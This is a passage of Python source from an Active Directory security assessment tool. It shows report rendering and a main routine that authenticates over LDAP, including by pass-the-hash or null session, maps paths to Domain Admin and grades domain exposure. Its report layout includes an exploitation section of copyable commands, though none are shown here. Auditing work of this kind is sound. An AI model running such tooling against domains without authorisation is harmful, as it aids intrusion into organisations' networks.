            parts.append(f'<div class="kc-block"><div class="kc-bh">Why it matters</div><div class="kc-bb">{self._e(doc["why"])}</div></div>')
        if doc.get("technical"):
            parts.append(f'<div class="kc-block"><div class="kc-bh">Technical</div><div class="kc-bb kc-mono">{self._e(doc["technical"])}</div></div>')
        # 4) tradecraft
        if doc.get("exploit"):
            items = "".join(f'<li><code>{self._e(x)}</code><button class="kc-copy" onclick="kcCopy(this)">copy</button></li>' for x in doc["exploit"])
            parts.append(f'<div class="kc-block kc-attack"><div class="kc-bh">Exploitation</div><ul class="kc-cmd">{items}</ul></div>')
        if doc.get("remediation"):
            items = "".join(f'<li>{self._e(x)}</li>' for x in doc["remediation"])
            parts.append(f'<div class="kc-block kc-fix"><div class="kc-bh">Remediation</div><ul class="kc-fixlist">{items}</ul></div>')
        # 5) framework mappings (ATT&CK / Mitigations / CIS / NIST)
        fw = self._frameworks_block(f)
        if fw:
            parts.append(fw)
        # 6) footer meta: rule id, operation, remediation effort, references
        refs = doc.get("refs") or []
        meta = (f'<span class="kc-mini">{self._e(f.rule_id)}</span>'
                f'<span class="kc-mini">{self._e(self._opcat(f))}</span> '
                f'{self._effort_badge(f.rule_id)}')
        if refs:
            meta += "".join(f' <a href="{self._e(u)}" target="_blank" rel="noopener" style="font-size:11px">ref↗</a>' for u in refs)
        parts.append(f'<div class="kc-block" style="border-top:1px solid var(--border);padding-top:8px">{meta}</div>')
        if not parts:
            parts.append('<div class="kc-bb">No additional detail.</div>')
        return "".join(parts)

    def _findings_section(self):
        # Group by operational category, then severity within — the way an
        # operator works the list during an engagement.
        sf = sorted(self.findings, key=lambda f:(OPCAT_ORDER.index(self._opcat(f)) if self._opcat(f) in OPCAT_ORDER else 9,
                                                 self._SEV_ORDER.get(f.severity,9), f.rule_id))
        rows = []; seen_rid = set()
        for i, f in enumerate(sf):
            oc = self._opcat(f); oc_col = OPCAT_COLOR.get(oc,"#888")
            anchor = f"f-{f.rule_id}" if f.rule_id not in seen_rid else f"f-{f.rule_id}-{i}"
            seen_rid.add(f.rule_id)
            eff = rule_effort(f.rule_id); ecol = EFFORT_COLOR.get(eff, "var(--muted)")
            rows.append(
                f'<tr class="kc-frow" id="{self._e(anchor)}" data-i="{i}" data-sev="{f.severity}" '
                f'data-cat="{self._e(oc)}" onclick="kcTog({i})" tabindex="0" role="button" '
                f'onkeydown="if(event.key===\'Enter\'||event.key===\' \'){{event.preventDefault();kcTog({i})}}">'
                f'<td><span id="ic-{i}" class="kc-toggle">+</span></td>'
                f'<td><span class="kc-sev-pill" style="background:{f.sev_color}">{self._e(f.severity)}</span></td>'
                f'<td><span class="kc-cat-pill" style="background:{oc_col}">{self._e(oc)}</span></td>'
                f'<td><code>{self._e(f.rule_id)}</code></td><td><strong>{self._e(f.title)}</strong></td>'
                f'<td><span class="kc-effort" style="--e:{ecol}">{self._e(eff)}</span></td>'
                f'<td class="kc-num">{f.points}</td></tr>'
                f'<tr class="kc-drow" id="dr-{i}" style="display:none"><td></td>'
                f'<td colspan="6"><div class="kc-panel">{self._finding_panel(f)}</div></td></tr>')
        catpills = "".join(
            f'<button class="kc-fp kc-fp-cat" data-f="cat:{self._e(c)}" onclick="kcFil(this)" '
            f'style="--c:{OPCAT_COLOR[c]}">{self._e(c)}</button>' for c in OPCAT_ORDER)
        pills = ('<button class="kc-fp kc-fp-on" data-f="sev:" onclick="kcFil(this)">All</button>'
                 '<button class="kc-fp" data-f="sev:CRITICAL" onclick="kcFil(this)" style="--c:#bd4234">Critical</button>'
                 '<button class="kc-fp" data-f="sev:HIGH" onclick="kcFil(this)" style="--c:#cb7a2f">High</button>'
                 '<button class="kc-fp" data-f="sev:MEDIUM" onclick="kcFil(this)" style="--c:#cda52b">Medium</button>'
                 '<button class="kc-fp" data-f="sev:LOW" onclick="kcFil(this)" style="--c:#74934a">Low</button>'
                 '<span class="kc-fsep"></span>' + catpills)
        return ('<section class="kc-section" id="sec-findings">'
                f'<h2 class="kc-h2">Findings <span class="kc-count">({len(self.findings)})</span></h2>'
                f'<div class="kc-toolbar"><div class="kc-pills">{pills}</div><div class="kc-toolbar-r">'
                '<input id="kc-q" type="search" placeholder="Search findings…" oninput="kcApply()">'
                '<button class="kc-fp" onclick="kcAll(1)">Expand</button>'
                '<button class="kc-fp" onclick="kcAll(0)">Collapse</button></div></div>'
                '<div class="kc-showing" id="kc-showing"></div>'
                '<table class="kc-table kc-ftable"><thead><tr><th style="width:28px"></th><th style="width:84px">Severity</th>'
                '<th style="width:150px">Operation</th><th style="width:180px">Rule</th>'
                '<th>Title</th><th style="width:84px">Effort</th>'
                '<th style="width:48px" class="kc-num">Pts</th></tr></thead>'
                f'<tbody>{"".join(rows)}</tbody></table></section>')

    # ── inventory ─────────────────────────────────────────────────────────────
    def _inventory_block(self):
        d = self.data
        en_u = sum(1 for u in d.users if not uac_has(get_int(u["attrs"],"userAccountControl"),UAC_ACCOUNTDISABLE))
        dis_u = len(d.users) - en_u
        en_c = sum(1 for c in d.computers if not uac_has(get_int(c["attrs"],"userAccountControl"),UAC_ACCOUNTDISABLE))
        sch = SCHEMA_VERSIONS.get(d.schema_version,str(d.schema_version)); maq = d.machine_account_quota
        def chip(ok, label):
            return f'<span class="{"kc-ok" if ok else "kc-bad"}">{label}</span>'
        maq_h = (f"<span class='kc-bad'>{maq}</span>" if maq>0 else (f"<span class='kc-ok'>0</span>" if maq==0 else "<span class='kc-warn'>?</span>"))
        stats = [("Domain FL", self._e(FUNCTIONAL_LEVELS.get(d.domain_level,str(d.domain_level)))),
                 ("Forest FL", self._e(FUNCTIONAL_LEVELS.get(d.forest_level,str(d.forest_level)))),
                 ("Schema", f"{self._e(sch)}"),
                 ("Users (en/dis)", f"{en_u} / {dis_u}"), ("Computers", str(en_c)),
                 ("DCs", str(len(d.dcs))), ("GPOs", str(len(d.gpos))),
                 ("Trusts", str(len(d.trusts))), ("Sites/subnets", f"{len(d.sites)} / {len(d.subnets)}"),
                 ("PSOs", str(len(d.psoes))), ("Cert templates", str(len(d.cert_templates))),
                 ("LAPS", chip(d.laps_installed, "yes" if d.laps_installed else "NO")),
                 ("MachineAcctQuota", maq_h),
                 ("ADWS 9389", chip(not d.adws_available, "open" if d.adws_available else "closed"))]
        cells = "".join(f'<div class="kc-stat"><div class="kc-stat-l">{l}</div><div class="kc-stat-v">{v}</div></div>' for l,v in stats)
        os_dist = defaultdict(int)
        for c in d.computers:
            if uac_has(get_int(c["attrs"],"userAccountControl"),UAC_ACCOUNTDISABLE):
                continue
            os_dist[get_str(c["attrs"],"operatingSystem") or "Unknown"] += 1
        top = sorted(os_dist.items(), key=lambda kv:-kv[1])[:8]; omax = max((n for _,n in top), default=1)
        bars = ""
        for os, n in top:
            eol = any(x in os for x in ("XP","2003","2008","Vista","2000","Windows 7"))
            col = "#bd4234" if eol else "#5d7a86"
            bars += (f'<div class="kc-bar-row"><div class="kc-bar-l">{self._e(os)}</div>'
                     f'<div class="kc-bar-t"><div class="kc-bar-f" style="width:{n/omax*100:.0f}%;background:{col}"></div></div>'
                     f'<div class="kc-bar-n">{n}</div></div>')
        # trust map (folded into inventory): scope / transitivity / direction /
        # SID-filtering + cross-domain risks — the reachable-domains view.
        trusts = ""
        tmap = getattr(d, "trust_map", None) or [classify_trust(t["attrs"]) for t in d.trusts]
        if tmap:
            rows = ""
            for c in tmap:
                sidf = ("<span class='kc-ok'>yes</span>" if c["sid_filtering"]
                        else "<span class='kc-bad'>no</span>")
                trans = "yes" if c["transitive"] else "no"
                risk = (f"<span class='kc-bad'>{self._e('; '.join(c['risks']))}</span>"
                        if c["risks"] else "<span class='kc-muted'>—</span>")
                rows += (f'<tr><td><strong>{self._e(c["name"])}</strong></td>'
                         f'<td>{self._e(c["scope"])}</td><td>{self._e(c["direction"])}</td>'
                         f'<td>{trans}</td><td>{sidf}</td><td class="kc-detail">{risk}</td></tr>')
            trusts = ('<div class="kc-sub-h">Trust map <span style="font-weight:400;'
                      'text-transform:none;letter-spacing:0;color:var(--faint)">— reachable '
                      'domains & cross-domain risk</span></div>'
                      '<table class="kc-table"><thead><tr><th>Partner</th><th>Scope</th>'
                      '<th>Direction</th><th>Transitive</th><th>SID filtering</th>'
                      '<th>Risk</th></tr></thead>'
                      f'<tbody>{rows}</tbody></table>')
        return ('<div class="kc-sub-h">Domain inventory</div>'
                f'<div class="kc-stat-grid">{cells}</div>'
                + (f'<div class="kc-invcols">'
                   f'<div><div class="kc-sub-h">Operating systems</div><div class="kc-barchart">{bars}</div></div>'
                   f'<div>{trusts}</div></div>' if (bars or trusts) else ""))

    # ── assemble ──────────────────────────────────────────────────────────────
    def render(self):
        drawer = ('<div class="kc-drawer-ov" id="kc-drawer-ov" onclick="kcCloseDrawer()"></div>'
                  '<aside class="kc-drawer" id="kc-drawer" aria-label="Node detail">'
                  '<div class="kc-dw-h"><span class="nm" id="kc-dw-name"></span>'
                  '<button class="kc-dw-x" onclick="kcCloseDrawer()" title="Close">✕</button></div>'
                  '<div class="kc-dw-b" id="kc-dw-body"></div></aside>')
        body = (self._head() + self._nav() + '<main class="kc-container">' +
                self._summary_section() + self._priorities_section() + self._paths_section() +
                self._privileged_section() + self._findings_section() + '</main>' + drawer +
                f'<footer class="kc-footer">{TOOL_NAME} v{VERSION} — authorized security assessment use only · '
                f'generated {self._e(self.ts)}</footer>'
                '<button class="kc-top" onclick="kcJump(\'top\')" title="Back to top">↑</button>')
        registry = '<script>window.KC_NODES=' + self._node_registry_json() + ';</script>'
        return ('<!DOCTYPE html><html lang="en" data-theme="dark"><head><meta charset="utf-8">'
                '<meta name="viewport" content="width=device-width,initial-scale=1">'
                f'<title>{TOOL_NAME} — {self._e(self.domain)}</title><style>' + _KC_CSS +
                '</style></head><body>' + body + registry +
                '<script>' + _KC_JS + '</script></body></html>')

    def _remediation(self, rule_id):
        r = (RULE_DOCS.get(rule_id, {}) or {}).get("remediation")
        return r[0] if r else ""


# ─────────────────────────────────────────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────────────────────────────────────────

def main():
    parser = build_parser()
    args   = parser.parse_args()

    # Flags that only make sense with Kerberos imply -k.
    if args.ccache or args.aes_key or args.save_ccache:
        args.kerberos = True

    # Prompt for a password when we have a user but no secret of any kind —
    # this covers both the NTLM path and "get me a TGT from a password".
    if (not args.null_session and not args.no_pass
            and args.username and args.password is None
            and not args.hashes and not args.aes_key and not args.ccache
            and not os.environ.get("KRB5CCNAME")):
        import getpass
        args.password = getpass.getpass(f"Password for {args.username}@{args.domain}: ")

    if (args.password is None and not (args.null_session or args.hashes
            or args.aes_key or args.ccache or os.environ.get("KRB5CCNAME"))):
        args.null_session = True
        print("[*] No credentials provided — attempting null session")

    auth_mode = ("Kerberos" if args.kerberos else
                 "NTLM (pass-the-hash)" if args.hashes else
                 "null session" if args.null_session else "NTLM")
    print(f"\n{'='*60}")
    print(f"  {TOOL_NAME} v{VERSION} — AD Security Assessment")
    print(f"  Domain : {args.domain}")
    print(f"  Target : {args.dc_ip}")
    print(f"  Proto  : {'LDAPS' if args.ldaps else 'LDAP'}  |  Auth: {auth_mode}")
    print(f"{'='*60}\n")

    # ── connect ──────────────────────────────────────────────────────────────
    ad_conn = ADConnection(args)
    print("[*] Connecting to LDAP...")
    try:
        if not ad_conn.connect():
            print("[-] Failed to connect. Check credentials and DC IP.")
            sys.exit(1)
    except Exception as e:
        print(f"[-] Connection error: {e}")
        if args.verbose:
            traceback.print_exc()
        sys.exit(1)

    print(f"[+] Connected. Base DN: {ad_conn.base_dn}")

    # ── collect data ─────────────────────────────────────────────────────────
    data = ADData(ad_conn, args)
    try:
        data.collect()
    except Exception as e:
        print(f"[-] Data collection error: {e}")
        if args.verbose:
            traceback.print_exc()

    # ── SYSVOL / GPO checks ──────────────────────────────────────────────────
    if not args.no_smb:
        sysvol = SYSVOLChecker(args, data)
        try:
            sysvol.run()
        except Exception as e:
            if args.verbose:
                print(f"[!] SYSVOL error: {e}")
                traceback.print_exc()

    # ── ACL analysis ─────────────────────────────────────────────────────────
    acl_analyzer = ACLAnalyzer(ad_conn, data, args)
    try:
        acl_analyzer.run()
    except Exception as e:
        if args.verbose:
            print(f"[!] ACL analysis error: {e}")
            traceback.print_exc()

    # ── control-path graph closure (who can become DA) ────────────────────────
    if args.no_paths:
        print("[*] Skipping control-path analysis (--no-paths).")
    else:
        try:
            ControlPathAnalyzer(ad_conn, data, args).run()
        except Exception as e:
            if args.verbose:
                print(f"[!] control-path analysis error: {e}")
                traceback.print_exc()

    # ── run checks ───────────────────────────────────────────────────────────
    print("[*] Running security checks...")
    engine = CheckEngine(data, args)
    try:
        engine.run_all()
    except Exception as e:
        print(f"[-] Check engine error: {e}")
        if args.verbose:
            traceback.print_exc()

    findings = engine.findings

    # ── SMB checks ────────────────────────────────────────────────────────────
    if not args.no_smb:
        smb = SMBChecker(args.dc_ip, args, findings)
        try:
            smb.run()
        except Exception as e:
            if args.verbose:
                print(f"[!] SMB check error: {e}")

    # ── score ─────────────────────────────────────────────────────────────────
    scorer = RiskScorer(findings, data)
    scores = scorer.score()

    # ── print summary ─────────────────────────────────────────────────────────
    sevc = defaultdict(int)
    for f in findings:
        sevc[f.severity] += 1
    print(f"\n{'='*60}")
    print(f"  POSTURE GRADE : {scores.get('grade','?')}  {scores.get('posture',0):3d}/100  "
          f"({scores.get('grade_word','')})")
    print(f"  EXPOSURE      : {scores['exposure']:3d}/100  ({scores.get('verdict','')})")
    print(f"  HYGIENE DEBT  : {scores['hygiene']:3d}/100  (misconfig & stale load)")
    print(f"{'='*60}")
    print(f"  Findings : {len(findings)}  "
          f"(CRIT {sevc['CRITICAL']} · HIGH {sevc['HIGH']} · "
          f"MED {sevc['MEDIUM']} · LOW {sevc['LOW']})")
    print(f"{'='*60}")

    sev_order = {"CRITICAL":0,"HIGH":1,"MEDIUM":2,"LOW":3,"INFO":4}
    sorted_findings = sorted(findings,
        key=lambda f:(sev_order.get(f.severity,5),f.category))
    for f in sorted_findings:
        color_map = {"CRITICAL":"\033[91m","HIGH":"\033[93m",
                      "MEDIUM":"\033[33m","LOW":"\033[32m","INFO":"\033[36m"}
        reset = "\033[0m"
        if args.no_color:
            color_map = defaultdict(str)
            reset = ""
        c = color_map.get(f.severity,"")
        print(f"  {c}[{f.severity:8s}]{reset} [{f.rule_id}] {f.title}")
        if f.details and args.verbose:
            print(f"           {f.details[:120]}")

    # ── HTML report ───────────────────────────────────────────────────────────
    if not args.output:
        ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        args.output = f"scout_{args.domain}_{ts}.html"

    reporter = HTMLReporter(args.domain, args.dc_ip, findings, scores, data,
                            auth_mode=auth_mode, prepared_by=args.operator,
                            scope=args.scope)
    html_out = reporter.render()
    with open(args.output, "w", encoding="utf-8") as fh:
        fh.write(html_out)
    print(f"\n[+] HTML report saved: {args.output}")

    # ── JSON output ───────────────────────────────────────────────────────────
    if args.json:
        jpath = args.json if args.json != "__AUTO__" else f"scout_{args.domain}.json"
        jdata = {
            "tool": TOOL_NAME, "version": VERSION,
            "domain": args.domain, "dc_ip": args.dc_ip, "auth_mode": auth_mode,
            "timestamp": datetime.datetime.now().isoformat(),
            "scores": {k: scores[k] for k in ("posture","grade","grade_word","exposure","hygiene","verdict","cat_counts") if k in scores},
            "findings": [
                {"rule_id": f.rule_id, "title": f.title,
                 "category": f.category, "operation": op_category(f.rule_id, f.category),
                 "severity": f.severity, "points": f.points, "mitre": f.mitre,
                 "details": f.details, "affected": f.affected}
                for f in sorted_findings
            ]
        }
        with open(jpath, "w", encoding="utf-8") as jf:
            json.dump(jdata, jf, indent=2)
        print(f"[+] JSON findings saved: {jpath}")

    # ── CSV output ────────────────────────────────────────────────────────────
    if args.csv:
        import csv as _csv
        cpath = args.csv if args.csv != "__AUTO__" else f"scout_{args.domain}.csv"
        with open(cpath, "w", encoding="utf-8", newline="") as cf:
            w = _csv.writer(cf)
            # Neutralize spreadsheet formula injection: a leading = + - @ (or
            # tab/CR) in attacker-controlled AD data could execute when opened in
            # Excel/LibreOffice, so prefix such cells with a single quote.
            def _safe(v):
                s = str(v)
                return "'" + s if s[:1] in ("=", "+", "-", "@", "\t", "\r") else s
            w.writerow(["rule_id", "title", "operation", "severity",
                        "points", "mitre", "affected_count", "details", "affected"])
            for f in sorted_findings:
                w.writerow([_safe(x) for x in
                            (f.rule_id, f.title, op_category(f.rule_id, f.category), f.severity,
                             f.points, "; ".join(f.mitre), len(f.affected),
                             f.details, " | ".join(map(str, f.affected)))])
        print(f"[+] CSV findings saved: {cpath}")

    print()
    # exit non-zero when a Tier-0 path is exposed (useful in CI gating). We gate
    # on exposure (the easiest path to Tier-0), not the posture grade, since a
    # broad-but-not-instantly-exploitable estate can still be a clean pentest pass.
    return 0 if scores.get("exposure", 0) < 35 else 1


if __name__ == "__main__":
    sys.exit(main())
